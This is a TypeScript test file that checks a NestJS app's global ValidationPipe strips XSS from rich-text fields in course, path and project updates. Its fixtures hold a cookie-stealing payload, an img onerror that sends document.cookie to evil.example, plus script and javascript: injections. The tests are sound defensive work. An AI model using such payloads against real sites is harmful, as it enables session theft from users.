import { ValidationPipe } from "@nestjs/common";
import { describe, expect, it } from "vitest";
import { UpdateCourseDto } from "../../src/modules/content/dto/authoring.dto";
import { UpdatePathDto } from "../../src/modules/content/dto/paths.dto";
import { UpdateProjectDto } from "../../src/modules/projects/dto/projects.dto";

/**
 * The sanitiser's own unit tests prove it strips payloads; these prove it is
 * actually WIRED — that a request body carrying `<img onerror=…>` is cleaned by
 * the real global ValidationPipe before a service ever sees it. A decorator that
 * silently isn't running would pass every other test in the repo.
 */
describe("rich-text sanitising through the real ValidationPipe", () => {
	// Same construction as main.ts.
	const pipe = new ValidationPipe({
		transform: true,
		whitelist: true,
		forbidNonWhitelisted: true,
	});

	const XSS = `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">`;

	async function run<T>(
		metatype: new () => T,
		body: Record<string, unknown>,
	): Promise<T> {
		return (await pipe.transform(body, {
			type: "body",
			metatype: metatype as never,
		})) as T;
	}

	it("cleans a course description on the way in", async () => {
		const dto = await run(UpdateCourseDto, { description: XSS });
		expect(dto.description).not.toContain("onerror");
		expect(dto.description).not.toContain("evil.example");
	});

	it("cleans lesson rich text (the biggest sink — it renders in the player)", async () => {
		const dto = await run(UpdateCourseDto, {
			description: `<p>ok</p><script>alert(1)</script>`,
		});
		expect(dto.description).toBe("<p>ok</p>");
	});

	it("cleans a path description and outcome statement", async () => {
		const dto = await run(UpdatePathDto, {
			description: XSS,
			outcomeStatement: `<a href="javascript:alert(1)">go</a>`,
		});
		expect(dto.description).not.toContain("onerror");
		expect(dto.outcomeStatement).not.toContain("javascript:");
	});

	it("cleans a project description", async () => {
		const dto = await run(UpdateProjectDto, { description: XSS });
		expect(dto.description).not.toContain("onerror");
	});

	it("leaves legitimate authored formatting intact", async () => {
		const rich = "<p><strong>Build</strong> a <em>todo</em> app</p>";
		const dto = await run(UpdateCourseDto, { description: rich });
		expect(dto.description).toBe(rich);
	});
});
